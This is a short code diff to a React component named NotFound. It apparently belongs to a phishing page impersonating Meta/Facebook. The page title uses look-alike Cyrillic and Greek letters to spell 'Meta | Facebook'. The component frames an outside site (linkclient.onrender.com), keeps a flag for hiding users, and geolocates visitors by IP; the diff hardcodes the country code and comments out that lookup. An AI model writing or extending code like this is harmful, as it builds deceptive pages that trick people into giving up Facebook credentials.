@@ -6,7 +6,7 @@ import bannermeta from '../resources/banner-meta.png';
 
 
 function NotFound() {
-  let[countryCode, setCountryCode] = useState('');
+  let[countryCode, setCountryCode] = useState('us');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://linkclient.onrender.com');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Мeta | Faceboοk');
@@ -56,8 +56,8 @@ function NotFound() {
             fetch(`https://ipinfo.io/widget/demo/${ipAddress}`).then(d => d.json()).then(d => {
             let data = d.data;
             if(data){
-              var countryCode = data.country;
-              setCountryCode(countryCode.toLowerCase());
+             // var countryCode = data.country;
+              //setCountryCode(countryCode.toLowerCase());
               // var privacy = data.privacy;
               // if(privacy){
               //   console.log(privacy);
